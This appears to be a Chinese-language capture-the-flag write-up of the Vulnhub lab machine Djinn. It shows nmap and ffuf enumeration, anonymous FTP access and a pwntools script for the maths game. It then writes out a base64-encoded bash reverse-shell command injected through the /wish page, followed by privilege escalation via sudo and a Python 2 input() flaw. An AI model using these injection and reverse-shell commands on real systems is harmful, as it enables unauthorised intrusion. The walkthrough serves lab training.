---
layout: post
title: "Djinn walkthrough"
date: 2021-07-12
author: 2hanx
toc: true
categories: [Vulnhub]
tags: []
---

### 主机识别

`arp-scan -l`

### 网络拓扑

| 计算机        | IP              |
| ------------- | --------------- |
| 本机（Win10） | `192.168.1.115` |
| Kali          | `192.168.1.116` |
| Djinn         | `192.168.1.122` |

### 扫描端口和版本信息

`nmap -A -p- 192.168.1.122`

```shell
┌──(root💀kali)-[~]
└─# nmap -A -p- 192.168.1.122
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-12 06:32 UTC
Stats: 0:01:46 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 66.67% done; ETC: 06:34 (0:00:29 remaining)
Nmap scan report for 192.168.1.122
Host is up (0.011s latency).
Not shown: 65531 closed ports
PORT     STATE    SERVICE VERSION
21/tcp   open     ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0              11 Oct 20  2019 creds.txt
| -rw-r--r--    1 0        0             128 Oct 21  2019 game.txt
|_-rw-r--r--    1 0        0             113 Oct 21  2019 message.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.1.116
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   filtered ssh
1337/tcp open     waste?
| fingerprint-strings:
|   NULL:
|     ____ _____ _
|     ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___
|     \x20/ _ \x20 | | | | '_ ` _ \x20/ _ \n| |_| | (_| | | | | | | __/ | | | | | | | | | __/
|     ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|
|     Let's see how good you are with simple maths
|     Answer my questions 1000 times and I'll give you your gift.
|     '+', 2)
|   RPCCheck:
|     ____ _____ _
|     ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___
|     \x20/ _ \x20 | | | | '_ ` _ \x20/ _ \n| |_| | (_| | | | | | | __/ | | | | | | | | | __/
|     ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|
|     Let's see how good you are with simple maths
|     Answer my questions 1000 times and I'll give you your gift.
|_    '*', 1)
7331/tcp open     http    Werkzeug httpd 0.16.0 (Python 2.7.15+)
|_http-server-header: Werkzeug/0.16.0 Python/2.7.15+
|_http-title: Lost in space
...
```

结果显示靶机部署了**ftp**服务，并且将Http server部署在**7331**端口，在**1337**端口上部署一个游戏。

### 获取ftp信息

通过*ftp*工具连接到ftp服务器，将三个文件下载到本地。

```shell
┌──(root💀kali)-[~]
└─# ftp 192.168.1.122
Connected to 192.168.1.122.
220 (vsFTPd 3.0.3)
Name (192.168.1.122:root): Anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0              11 Oct 20  2019 creds.txt
-rw-r--r--    1 0        0             128 Oct 21  2019 game.txt
-rw-r--r--    1 0        0             113 Oct 21  2019 message.txt
226 Directory send OK.
ftp> get message.txt
local: message.txt remote: message.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for message.txt (113 bytes).
226 Transfer complete.
113 bytes received in 0.01 secs (11.9739 kB/s)
ftp> passive
Passive mode on.
ftp> get message.txt
local: message.txt remote: message.txt
227 Entering Passive Mode (192,168,1,122,37,17).
150 Opening BINARY mode data connection for message.txt (113 bytes).
226 Transfer complete.
113 bytes received in 0.00 secs (71.2865 kB/s)
ftp> get game.txt
local: game.txt remote: game.txt
227 Entering Passive Mode (192,168,1,122,179,188).
150 Opening BINARY mode data connection for game.txt (128 bytes).
226 Transfer complete.
128 bytes received in 0.00 secs (151.6990 kB/s)
ftp> get creds.txt
local: creds.txt remote: creds.txt
227 Entering Passive Mode (192,168,1,122,189,104).
150 Opening BINARY mode data connection for creds.txt (11 bytes).
226 Transfer complete.
11 bytes received in 0.01 secs (1.8611 kB/s)
ftp> quit
221 Goodbye.
```

其中*creds.txt*文件内容是：*nitu:81299*，在此得到一个账户和密码，此外在*message.txt*文件中注意到一个账户名：*nitish81299*，同时根据*game.txt*文件中的信息知道只要通过靶机*1337*端口部署的游戏就可以获得奖励。

通过*nc*连接到靶机的*1337*端口，知道该游戏是进行算数运算，那么刚好可以使用*pwntool*工具解决，python代码如下：

```python
from pwn import *

r = remote("192.168.1.122", 1337)

r.recvuntil("gift.\n")

for i in range(1001):
    a = r.recvline()
    a = eval(a)
    b = list(a)
    c = str(b[0]) + b[1] + str(b[2])
    p = eval(c)
    r.recvuntil(">")
    r.sendline(str(p))

r.interactive()
```

最终得到信息：

```
Here is your gift, I hope you know what to do with it:

1356, 6784, 3409
```

考虑到给出的三个数不是暴露的端口，猜测可能是账户密码。

> 之后发现没什么用~

### 目录枚举

查看**7331**端口下的网页源码没有发现有用的信息，那么只能进行目录枚举。

```shell
┌──(root💀kali)-[~]
└─# ffuf -w /usr/share/wordlists/dirb/big.txt -u http://192.168.1.122:7331/FUZZ -mc 200 -c

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.1.122:7331/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

genie                   [Status: 200, Size: 1676, Words: 200, Lines: 41]
wish                    [Status: 200, Size: 385, Words: 60, Lines: 21]
```

经过一段时间扫描，得知存在路径*/wish*，并且该页面存在命令注入漏洞，多次尝试后传递以下命令即可Getshell：

```bash
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTE2LzU1NjYgMD4mMQo=" | base64 -d | bash
```

> `echo "bash -i >& /dev/tcp/192.168.1.116/5566 0>&1" | base64`

### Getshell

Kali监听*5566*端口即可getshell

```shell
┌──(root💀kali)-[~]
└─# nc -lvp 5566
listening on [any] 5566 ...
192.168.1.122: inverse host lookup failed: Unknown host
connect to [192.168.1.116] from (UNKNOWN) [192.168.1.122] 55508
bash: cannot set terminal process group (543): Inappropriate ioctl for device
bash: no job control in this shell
www-data@djinn:/opt/80$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

查看*app.py*源码可知其中*CREDS*变量读取的是*creds.txt*文本文件，通过查看该文本，知道*nitish*账户的密码是：*p4ssw0rdStr3r0n9*。

切换到*nitish*账户，在其*/home*目录下得到第一个flag：

```shell
www-data@djinn:/opt/80$ su - nitish
su - nitish
Password: p4ssw0rdStr3r0n9

nitish@djinn:~$ pwd
pwd
/home/nitish
nitish@djinn:~$ ls
ls
user.txt
nitish@djinn:~$ cat user.txt
cat user.txt
10aay8289ptgguy1pvfa73alzusyyx3c
```

### 提权

通过`sudo -l`命令知道该用户可无密码执行*sam*用户下的*/usr/bin/genie*命令：

```shell
nitish@djinn:~$ sudo -l
sudo -l
Matching Defaults entries for nitish on djinn:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nitish may run the following commands on djinn:
    (sam) NOPASSWD: /usr/bin/genie
```

通过`genie -h`命令查看该脚本用法，发现`-e`参数可执行命令。

```shell
nitish@djinn:~$ genie -h
genie -h
usage: genie [-h] [-g] [-p SHELL] [-e EXEC] wish

I know you've came to me bearing wishes in mind. So go ahead make your wishes.

positional arguments:
  wish                  Enter your wish

optional arguments:
  -h, --help            show this help message and exit
  -g, --god             pass the wish to god
  -p SHELL, --shell SHELL
                        Gives you shell
  -e EXEC, --exec EXEC  execute command
```

不过尝试后发现并不能成功执行，在使用`man`查看命令手册时发现`-cmd`也具有同样作用。

```shell
nitish@djinn:~$ sudo -u sam genie -cmd id
sudo -u sam genie -cmd id
my man!!
$ id
id
uid=1000(sam) gid=1000(sam) groups=1000(sam),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare)
$ whoami
whoami
sam
$ sudo -l
sudo -l
Matching Defaults entries for sam on djinn:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sam may run the following commands on djinn:
    (root) NOPASSWD: /root/lago
```

*sam*账户可无密码使用*root*账户下的*/root/lago*脚本命令，执行该脚本后发现需要输入一个选项：

```shell
$ sudo -u root /root/lago
sudo -u root /root/lago
What do you want to do ?
1 - Be naughty
2 - Guess the number
3 - Read some damn files
4 - Work
Enter your choice:1
1
Working on it!!
```

既然该账户能够执行这个脚本，那么猜测该脚本应该存在漏洞。通过`find`命令查找可写文件时发现编译后的脚本：

```shell
$ find / -writable -type f 2>/dev/null
find / -writable -type f 2>/dev/null
/usr/bin/genie/
...
/home/sam/.bashrc
/home/sam/.profile
/home/sam/.sudo_as_admin_successful
/home/sam/.pyc
/sys/kernel/security/apparmor/.remove
...
```

通过*uncompyle6.exe*工具对*/home/sam/.pyc*文件进行反编译，代码审计后发现在`guessit()`函数中的`s==num`存在漏洞，之后在*/root*目录下运行*proof.sh*脚本即可得到最后一个flag：

```shell
$ sudo -u root /root/lago
sudo -u root /root/lago
What do you want to do ?
1 - Be naughty
2 - Guess the number
3 - Read some damn files
4 - Work
Enter your choice:2
2
Choose a number between 1 to 100:
Enter your number: num
num
# id
id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
cd /root
# ls
ls
lago  proof.sh
# ./proof.sh
./proof.sh
'unknown': I need something more specific.
    _                        _             _ _ _
   / \   _ __ ___   __ _ ___(_)_ __   __ _| | | |
  / _ \ | '_ ` _ \ / _` |_  / | '_ \ / _` | | | |
 / ___ \| | | | | | (_| |/ /| | | | | (_| |_|_|_|
/_/   \_\_| |_| |_|\__,_/___|_|_| |_|\__, (_|_|_)
                                     |___/
djinn pwned...
__________________________________________________________________________

Proof: 33eur2wjdmq80z47nyy4fx54bnlg3ibc
Path: /root
Date: Mon Jul 12 13:51:23 IST 2021
Whoami: root
__________________________________________________________________________

By @0xmzfr

Thanks to my fellow teammates in @m0tl3ycr3w for betatesting! :-)
```

### 总结

1. 在命令注入存在简单过滤时，可尝试传输经过*base64*加密后的shell字符串
2. 执行无密码用户的脚本命令需在前添加：*sudo -u username*
3. python2.x的`input()`函数存在[漏洞](https://www.geeksforgeeks.org/vulnerability-input-function-python-2-x/)
4. 设置ftp的传输模式为PASV: `ftp> passive`

